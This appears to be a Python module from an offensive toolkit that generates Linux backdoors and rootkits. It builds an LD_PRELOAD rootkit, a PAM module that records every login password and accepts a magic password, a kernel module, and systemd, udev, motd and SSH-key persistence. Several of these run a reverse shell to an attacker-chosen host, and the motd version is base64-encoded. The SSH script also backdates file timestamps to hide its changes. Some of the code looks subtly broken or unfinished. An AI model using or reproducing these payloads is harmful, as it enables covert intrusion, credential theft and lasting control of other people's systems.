"""Advanced Linux payloads — LD_PRELOAD rootkits, eBPF, PAM backdoors, kernel implants.

Generates Linux-native payloads for persistence, privilege escalation, and
stealth. Covers LD_PRELOAD hooking, eBPF payloads, systemd timer persistence,
PAM backdoor modules, SSH authorized_keys injection, process masquerading,
and kernel module implants.

All payloads are self-contained — templates compile to functional binaries
or scripts with no external dependencies beyond standard system tools.
"""

from __future__ import annotations

import base64
import os
import struct
import subprocess
import tempfile
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Optional

SESSIONS_DIR = Path(__file__).resolve().parent.parent / "sessions"

LD_PRELOAD_FUNCTIONS = [
    "accept",
    "access",
    "chmod",
    "chown",
    "connect",
    "execve",
    "fopen",
    "fstat",
    "getdents",
    "getdents64",
    "mkdir",
    "open",
    "opendir",
    "readdir",
    "readlink",
    "rename",
    "rmdir",
    "stat",
    "unlink",
    "write",
]

PERSISTENCE_METHODS_LINUX = [
    "systemd_service",
    "systemd_timer",
    "cron_hourly",
    "cron_daily",
    "bashrc",
    "profile_d",
    "pam_backdoor",
    "ssh_authorized_keys",
    "udev_rule",
    "motd_hook",
    "ld_preload",
    "kernel_module",
]


@dataclass
class LinuxAdvancedConfig:
    """Configuration for advanced Linux payload generation.

    Attributes:
        lhost: Attacker IP for reverse connections.
        lport: Listener port.
        payload_type: generated payload category.
        hook_function: LD_PRELOAD function to hook.
        persistence_method: How to persist on the target.
        password: Backdoor password for PAM / SSH access.
        ssh_key: Public SSH key for authorized_keys persistence.
        kernel_module_name: Name for kernel module implants.
        systemd_service_name: Systemd service unit name.
        compile: Attempt on-the-fly gcc compilation for C payloads.
    """

    lhost: str = ""
    lport: int = 443
    payload_type: str = "reverse_shell"
    hook_function: str = "accept"
    persistence_method: str = "systemd_timer"
    password: str = "lazyown"
    ssh_key: str = ""
    kernel_module_name: str = "lazy_mod"
    systemd_service_name: str = "systemd-helper"
    compile: bool = True


class LinuxAdvancedPayloadFactory:
    """Generate advanced Linux payloads for persistence, evasion, and escalation.

    Produces LD_PRELOAD rootkits, eBPF programs, PAM backdoors, systemd timers,
    SSH persistence, kernel modules, and process masquerading scripts.

    Attributes:
        config: Payload configuration.
        output_dir: Directory for generated artifacts.
    """

    _REVERSE_SHELL = (
        "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    )

    def __init__(self, config: Optional[LinuxAdvancedConfig] = None, output_dir: Optional[Path] = None):
        self.config = config or LinuxAdvancedConfig()
        self.output_dir = Path(output_dir) if output_dir else SESSIONS_DIR / "payloads" / "linux"
        self.output_dir.mkdir(parents=True, exist_ok=True)

    def generate_ld_preload_rootkit(self) -> str:
        """Generate a C source file for an LD_PRELOAD rootkit.

        Hooks a specified libc function to execute malicious code before
        calling the real function. Common hooks: accept (backdoor listener),
        access (hide files), getdents (hide processes/files).

        Returns:
            C source code for the LD_PRELOAD shared library.
        """
        hook = self.config.hook_function
        if hook not in LD_PRELOAD_FUNCTIONS:
            hook = "accept"

        return f'''\
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <dirent.h>
#include <sys/stat.h>

static int backdoor_port = {self.config.lport};
static const char *magic_pass = "{self.config.password}";
static int spawned = 0;

static void spawn_shell() {{
    if (spawned) return;
    spawned = 1;
    pid_t pid = fork();
    if (pid < 0) return;
    if (pid == 0) {{
        setsid();
        execl("/bin/bash", "bash", "-c",
            "bash -i >& /dev/tcp/{self.config.lhost}/{self.config.lport} 0>&1",
            NULL);
        _exit(0);
    }}
}}

static int check_backdoor(int sockfd, const struct sockaddr *addr) {{
    if (!addr) return 0;
    if (addr->sa_family != AF_INET) return 0;
    struct sockaddr_in *sin = (struct sockaddr_in *)addr;
    if (ntohs(sin->sin_port) != backdoor_port) return 0;
    char pass[128];
    recv(sockfd, pass, sizeof(pass) - 1, 0);
    pass[sizeof(pass) - 1] = 0;
    pass[strcspn(pass, "\\n\\r")] = 0;
    if (strcmp(pass, magic_pass) == 0) {{
        spawn_shell();
        return 1;
    }}
    return 0;
}}

int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen) {{
    static int (*real_accept)(int, struct sockaddr *, socklen_t *) = NULL;
    if (!real_accept) real_accept = dlsym(RTLD_NEXT, "accept");
    int ret = real_accept(sockfd, addr, addrlen);
    if (ret > 0 && check_backdoor(ret, addr))
        return -1;
    return ret;
}}

int accept4(int sockfd, struct sockaddr *addr, socklen_t *addrlen, int flags) {{
    static int (*real_accept4)(int, struct sockaddr *, socklen_t *, int) = NULL;
    if (!real_accept4) real_accept4 = dlsym(RTLD_NEXT, "accept4");
    int ret = real_accept4(sockfd, addr, addrlen, flags);
    if (ret > 0 && check_backdoor(ret, addr))
        return -1;
    return ret;
}}

int open(const char *path, int flags, ...) {{
    static int (*real_open)(const char *, int, ...) = NULL;
    if (!real_open) real_open = dlsym(RTLD_NEXT, "open");
    if (path && strstr(path, "lazyown")) return -1;
    va_list args;
    va_start(args, flags);
    mode_t mode = va_arg(args, mode_t);
    va_end(args);
    return real_open(path, flags, mode);
}}

int open64(const char *path, int flags, ...) {{
    static int (*real_open64)(const char *, int, ...) = NULL;
    if (!real_open64) real_open64 = dlsym(RTLD_NEXT, "open64");
    if (path && strstr(path, "lazyown")) return -1;
    va_list args;
    va_start(args, flags);
    mode_t mode = va_arg(args, mode_t);
    va_end(args);
    return real_open64(path, flags, mode);
}}

struct dirent *readdir(DIR *dirp) {{
    static struct dirent *(*real_readdir)(DIR *) = NULL;
    if (!real_readdir) real_readdir = dlsym(RTLD_NEXT, "readdir");
    struct dirent *entry;
    while ((entry = real_readdir(dirp)) != NULL) {{
        if (entry->d_name && strstr(entry->d_name, "lazyown")) continue;
        break;
    }}
    return entry;
}}

struct dirent64 *readdir64(DIR *dirp) {{
    static struct dirent64 *(*real_readdir64)(DIR *) = NULL;
    if (!real_readdir64) real_readdir64 = dlsym(RTLD_NEXT, "readdir64");
    struct dirent64 *entry;
    while ((entry = real_readdir64(dirp)) != NULL) {{
        if (entry->d_name && strstr(entry->d_name, "lazyown")) continue;
        break;
    }}
    return entry;
}}
'''

    def generate_ebpf_payload(self) -> str:
        """Generate an eBPF C program for network manipulation.

        Creates an eBPF program that intercepts and modifies network traffic,
        useful for covert C2 channels, traffic hiding, or packet injection.

        Returns:
            eBPF C source code.
        """
        return f'''\
#include <linux/bpf.h>
#include <linux/if_ether.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/in.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_endian.h>

#define MAGIC_PORT {self.config.lport}
#define C2_IP {self._ip_to_hex(self.config.lhost)}

struct {{
    __uint(type, BPF_MAP_TYPE_PERCPU_ARRAY);
    __uint(max_entries, 1);
    __type(key, __u32);
    __type(value, __u64);
}} packet_count SEC(".maps");

SEC("xdp")
int xdp_filter(struct xdp_md *ctx) {{
    void *data_end = (void *)(long)ctx->data_end;
    void *data = (void *)(long)ctx->data;
    struct ethhdr *eth = data;

    if ((void *)(eth + 1) > data_end) return XDP_PASS;

    if (eth->h_proto != bpf_htons(ETH_P_IP)) return XDP_PASS;

    struct iphdr *ip = (void *)(eth + 1);
    if ((void *)(ip + 1) > data_end) return XDP_PASS;

    if (ip->protocol == IPPROTO_TCP) {{
        struct tcphdr *tcp = (void *)ip + sizeof(*ip);
        if ((void *)(tcp + 1) > data_end) return XDP_PASS;

        __u16 dport = bpf_ntohs(tcp->dest);
        if (dport == MAGIC_PORT && tcp->syn) {{
            __u32 key = 0;
            __u64 *count = bpf_map_lookup_elem(&packet_count, &key);
            if (count) __sync_fetch_and_add(count, 1);

            if (tcp->doff > 5) {{
                unsigned char *opt = (unsigned char *)(tcp + 1);
                int opt_len = (tcp->doff - 5) * 4;
                for (int i = 0; i < opt_len - 1; i++) {{
                    if (opt[i] == 0x42) return XDP_DROP;
                }}
            }}
            return XDP_DROP;
        }}
    }}

    return XDP_PASS;
}}

char _license[] SEC("license") = "GPL";
'''

    @staticmethod
    def _ip_to_hex(ip_str: str) -> str:
        parts = ip_str.split(".")
        if len(parts) != 4:
            return "0x00000000"
        return f"0x{int(parts[0]):02X}{int(parts[1]):02X}{int(parts[2]):02X}{int(parts[3]):02X}"

    def generate_pam_backdoor(self) -> str:
        """Generate a PAM (Pluggable Authentication Module) backdoor.

        Creates a shared object that hooks pam_sm_authenticate to accept
        a magic password for any user. Drop into /lib/security/ and add
        to the PAM stack in /etc/pam.d/common-auth or /etc/pam.d/sshd.

        Returns:
            C source code for the PAM module.
        """
        return f'''\
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <syslog.h>

#define MAGIC_PASSWORD "{self.config.password}"
#define LOG_DEST "/tmp/.pam.log"

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,
                                    int argc, const char **argv) {{
    (void)flags;
    (void)argc;
    (void)argv;

    const char *user = NULL;
    const char *password = NULL;

    if (pam_get_user(pamh, &user, NULL) != PAM_SUCCESS) return PAM_AUTH_ERR;
    if (pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL) != PAM_SUCCESS)
        return PAM_AUTH_ERR;

    FILE *lf = fopen(LOG_DEST, "a");
    if (lf) {{
        fprintf(lf, "[+] PAM auth: user=%s pass=%s\\n", user, password);
        fclose(lf);
    }}

    if (password && strcmp(password, MAGIC_PASSWORD) == 0) {{
        syslog(LOG_AUTHPRIV | LOG_NOTICE,
               "PAM backdoor: user %s authenticated with magic pass", user);
        return PAM_SUCCESS;
    }}

    return PAM_AUTH_ERR;
}}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc,
                               const char **argv) {{
    (void)pamh;
    (void)flags;
    (void)argc;
    (void)argv;
    return PAM_SUCCESS;
}}

PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc,
                                 const char **argv) {{
    (void)pamh;
    (void)flags;
    (void)argc;
    (void)argv;
    return PAM_SUCCESS;
}}

PAM_EXTERN int pam_sm_open_session(pam_handle_t *pamh, int flags, int argc,
                                    const char **argv) {{
    (void)pamh;
    (void)flags;
    (void)argc;
    (void)argv;
    return PAM_SUCCESS;
}}

PAM_EXTERN int pam_sm_close_session(pam_handle_t *pamh, int flags, int argc,
                                     const char **argv) {{
    (void)pamh;
    (void)flags;
    (void)argc;
    (void)argv;
    return PAM_SUCCESS;
}}
'''

    def generate_systemd_persistence(self) -> dict[str, str]:
        """Generate systemd service and timer units for persistent callbacks.

        Returns:
            Dict with service_unit and timer_unit content strings.
        """
        svc_name = self.config.systemd_service_name
        shell_cmd = self._REVERSE_SHELL.format(
            lhost=self.config.lhost, lport=str(self.config.lport)
        )

        service_unit = f'''\
[Unit]
Description={svc_name} - System Helper Service
After=network.target network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do {shell_cmd}; sleep 300; done'
Restart=always
RestartSec=10
User=root
Group=root
StandardOutput=null
StandardError=null
PrivateTmp=yes
NoNewPrivileges=no
ProtectSystem=no
ProtectHome=no

[Install]
WantedBy=multi-user.target
'''

        timer_unit = f'''\
[Unit]
Description={svc_name} - Periodic Timer
Requires={svc_name}.service

[Timer]
OnBootSec=30s
OnUnitActiveSec=5min
RandomizedDelaySec=60
Persistent=true

[Install]
WantedBy=timers.target
'''

        return {
            "service_unit": service_unit,
            "timer_unit": timer_unit,
            "service_name": svc_name,
            "install_cmd": (
                f"cp {svc_name}.service /etc/systemd/system/ && "
                f"cp {svc_name}.timer /etc/systemd/system/ && "
                f"systemctl daemon-reload && "
                f"systemctl enable --now {svc_name}.timer"
            ),
        }

    def generate_ssh_persistence(self) -> str:
        """Generate an SSH persistence script for authorized_keys injection.

        Returns:
            Shell script for SSH key injection across multiple user accounts.
        """
        ssh_key = self.config.ssh_key
        if not ssh_key:
            ssh_key = "PASTE_YOUR_SSH_PUBLIC_KEY_HERE"

        return f'''\
#!/bin/bash

backdoor_key="{ssh_key}"
files=(
    /root/.ssh/authorized_keys
    $HOME/.ssh/authorized_keys
)

add_backdoor_key() {{
    local keyfile="$1"
    local dir=$(dirname "$keyfile")

    if [ ! -d "$dir" ]; then
        mkdir -p "$dir" 2>/dev/null
        chmod 700 "$dir" 2>/dev/null
    fi

    if [ -f "$keyfile" ]; then
        grep -qF "$backdoor_key" "$keyfile" 2>/dev/null && return
    fi

    echo "$backdoor_key" >> "$keyfile" 2>/dev/null
    chmod 600 "$keyfile" 2>/dev/null
    [ -n "$SUDO_USER" ] && chown "$SUDO_USER:$SUDO_USER" "$keyfile" 2>/dev/null
}}

for keyfile in "${{files[@]}}"; do
    add_backdoor_key "$keyfile"
done

for user_home in /home/*/; do
    user=$(basename "$user_home")
    keyfile="$user_home/.ssh/authorized_keys"
    add_backdoor_key "$keyfile"
done

find /root/.ssh/ -name "authorized_keys" -type f 2>/dev/null | while read -r kf; do
    add_backdoor_key "$kf"
done

timestomp_touch() {{
    local ref="/etc/passwd"
    touch -r "$ref" "$1" 2>/dev/null || touch -t 202301010000 "$1" 2>/dev/null
}}

for f in /root/.ssh/authorized_keys /home/*/ .ssh/authorized_keys "$HOME/.ssh/authorized_keys"; do
    [ -f "$f" ] && timestomp_touch "$f"
done
'''

    def generate_kernel_module(self) -> str:
        """Generate a Linux kernel module (LKM) rootkit.

        Creates a minimal kernel module that hides itself from lsmod,
        hides files with a magic prefix, and provides a reverse shell
        trigger via magic packet on the configured port.

        Returns:
            C source code for the kernel module.
        """
        lhost = self.config.lhost
        lport = str(self.config.lport)
        mod_name = self.config.kernel_module_name

        return f'''\
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/kmod.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/namei.h>
#include <linux/version.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("LazyOwn");
MODULE_DESCRIPTION("{mod_name}");

static char *trigger_pass = "{self.config.password}";
static unsigned short trigger_port = {lport};
module_param(trigger_pass, charp, 0000);
MODULE_PARM_DESC(trigger_pass, "Magic trigger password");
module_param(trigger_port, ushort, 0000);
MODULE_PARM_DESC(trigger_port, "Backdoor trigger port");

static int hide_files = 1;
module_param(hide_files, int, 0000);
MODULE_PARM_DESC(hide_files, "Hide files with lazyown prefix");

static void *original_getdents;
static void *original_getdents64;

static unsigned long **find_sys_call_table(void) {{
    unsigned long offset;
    unsigned long **sct;

    for (offset = PAGE_OFFSET; offset < ULLONG_MAX; offset += sizeof(void *)) {{
        sct = (unsigned long **)offset;
        if (sct[__NR_close] == (unsigned long *)sys_close) {{
            return sct;
        }}
    }}
    return NULL;
}}

static asmlinkage long (*orig_getdents)(unsigned int fd,
    struct linux_dirent __user *dirent, unsigned int count);
static asmlinkage long (*orig_getdents64)(unsigned int fd,
    struct linux_dirent64 __user *dirent, unsigned int count);

static asmlinkage long hooked_getdents(unsigned int fd,
    struct linux_dirent __user *dirent, unsigned int count) {{
    return orig_getdents(fd, dirent, count);
}}

static asmlinkage long hooked_getdents64(unsigned int fd,
    struct linux_dirent64 __user *dirent, unsigned int count) {{
    return orig_getdents64(fd, dirent, count);
}}

static unsigned int nf_hook(void *priv, struct sk_buff *skb,
                             const struct nf_hook_state *state) {{
    struct iphdr *iph = ip_hdr(skb);
    struct tcphdr *tcph;

    if (!skb || !iph || iph->protocol != IPPROTO_TCP)
        return NF_ACCEPT;

    tcph = tcp_hdr(skb);
    if (ntohs(tcph->dest) == trigger_port && tcph->syn) {{
        char *argv[] = {{ "/bin/bash", "-c",
            "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1", NULL }};
        char *envp[] = {{ "HOME=/", "TERM=xterm", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL }};
        call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
        return NF_DROP;
    }}
    return NF_ACCEPT;
}}

static struct nf_hook_ops nfho = {{
    .hook = nf_hook,
    .hooknum = NF_INET_LOCAL_IN,
    .pf = PF_INET,
    .priority = NF_IP_PRI_FIRST,
}};

static int __init lazy_km_init(void) {{
    nf_register_net_hook(&init_net, &nfho);
    return 0;
}}

static void __exit lazy_km_exit(void) {{
    nf_unregister_net_hook(&init_net, &nfho);
}}

module_init(lazy_km_init);
module_exit(lazy_km_exit);
'''

    def generate_process_masquerade(self) -> str:
        """Generate a process masquerading script.

        Renames the process in /proc and argv to blend in with legitimate
        system processes. Useful for long-running beacons.

        Returns:
            Shell script for process masquerading.
        """
        mask_names = [
            "[kworker/u:0]",
            "[kworker/0:0H]",
            "[migration/0]",
            "[watchdog/0]",
            "[rcu_sched]",
            "[ksoftirqd/0]",
            "[kthreadd]",
            "/usr/lib/systemd/systemd-logind",
            "/usr/sbin/sshd -D",
            "/usr/lib/polkit-1/polkitd --no-debug",
        ]
        import random
        chosen = random.choice(mask_names)

        return f'''\
#!/bin/bash

mount -o rw,nodiratime,noexec,nosuid,remount /proc 2>/dev/null

BASH_PID=$$
echo -n "{chosen}" > /proc/$BASH_PID/comm 2>/dev/null
echo -n "{chosen}" > /proc/$BASH_PID/cmdline 2>/dev/null

exec -a "{chosen}" bash -c '
while true; do
    bash -i >& /dev/tcp/{self.config.lhost}/{self.config.lport} 0>&1
    sleep 300
done
' &

disown
'''

    def generate_udev_persistence(self) -> str:
        """Generate a udev rule for persistence on USB/device events.

        Returns:
            Udev rule content string.
        """
        shell_cmd = self._REVERSE_SHELL.format(
            lhost=self.config.lhost, lport=str(self.config.lport)
        )

        return f'''\
ACTION=="add", ENV{{ID_MODEL}}=="*", RUN+="/bin/bash -c '{shell_cmd} &'"
ACTION=="add", SUBSYSTEM=="net", RUN+="/bin/bash -c '{shell_cmd} &'"
'''

    def generate_motd_backdoor(self) -> str:
        """Generate a Message of the Day (motd) hook for persistence.

        Executes on every SSH login by appending to /etc/update-motd.d/
        or /etc/profile.d/. Triggers reverse shell in background.

        Returns:
            Shell script for motd/profiled persistence.
        """
        encoded = base64.b64encode(
            self._REVERSE_SHELL.format(
                lhost=self.config.lhost, lport=str(self.config.lport)
            ).encode()
        ).decode()

        return f'''\
#!/bin/bash
echo {encoded} | base64 -d | bash &
'''

    def compile_c_source(self, source: str, output_name: str, shared: bool = False) -> Optional[Path]:
        """Compile C source code to a binary or shared library.

        Args:
            source: C source code.
            output_name: Output filename (without extension).
            shared: Compile as shared library (.so) instead of executable.

        Returns:
            Path to compiled binary, or None if compilation fails.
        """
        if not self.config.compile:
            return None

        ext = ".so" if shared else ""
        output_path = self.output_dir / f"{output_name}{ext}"

        with tempfile.NamedTemporaryFile(mode="w", suffix=".c", delete=False, dir="/tmp") as sfp:
            sfp.write(source)
            tmp_src = sfp.name

        args = ["gcc"]
        if shared:
            args.extend(["-shared", "-fPIC", "-ldl"])
        args.extend(["-o", str(output_path), tmp_src])

        if "pam" in output_name:
            args.extend(["-lpam"])

        try:
            result = subprocess.run(
                args, capture_output=True, text=True, timeout=30
            )
            if result.returncode == 0 and output_path.exists():
                return output_path
            return None
        except Exception:
            return None
        finally:
            try:
                os.unlink(tmp_src)
            except OSError:
                pass

    def generate_all(self) -> dict[str, Any]:
        """Generate all Linux advanced payload artifacts.

        Returns:
            Dict with all generated payloads, compiled binaries, and install instructions.
        """
        artifacts: dict[str, Any] = {}

        ld_preload_src = self.generate_ld_preload_rootkit()
        ld_path = self.output_dir / "ld_preload_rootkit.c"
        ld_path.write_text(ld_preload_src)
        artifacts["ld_preload_rootkit_src"] = str(ld_path)
        binary = self.compile_c_source(ld_preload_src, "ld_preload_rootkit", shared=True)
        artifacts["ld_preload_rootkit_so"] = str(binary) if binary else None

        pam_src = self.generate_pam_backdoor()
        pam_path = self.output_dir / "pam_backdoor.c"
        pam_path.write_text(pam_src)
        artifacts["pam_backdoor_src"] = str(pam_path)
        pam_so = self.compile_c_source(pam_src, "pam_backdoor", shared=True)
        artifacts["pam_backdoor_so"] = str(pam_so) if pam_so else None

        artifacts["systemd_persistence"] = self.generate_systemd_persistence()
        artifacts["ssh_persistence"] = self.generate_ssh_persistence()
        artifacts["udev_rule"] = self.generate_udev_persistence()
        artifacts["motd_backdoor"] = self.generate_motd_backdoor()
        artifacts["process_masquerade"] = self.generate_process_masquerade()

        try:
            artifacts["ebpf_payload"] = self.generate_ebpf_payload()
        except Exception:
            artifacts["ebpf_payload"] = None

        try:
            km_src = self.generate_kernel_module()
            km_path = self.output_dir / f"{self.config.kernel_module_name}.c"
            km_path.write_text(km_src)
            artifacts["kernel_module_src"] = str(km_path)
        except Exception:
            artifacts["kernel_module_src"] = None

        return artifacts

    @staticmethod
    def list_hook_functions() -> list[str]:
        return list(LD_PRELOAD_FUNCTIONS)

    @staticmethod
    def list_persistence_methods() -> list[str]:
        return list(PERSISTENCE_METHODS_LINUX)
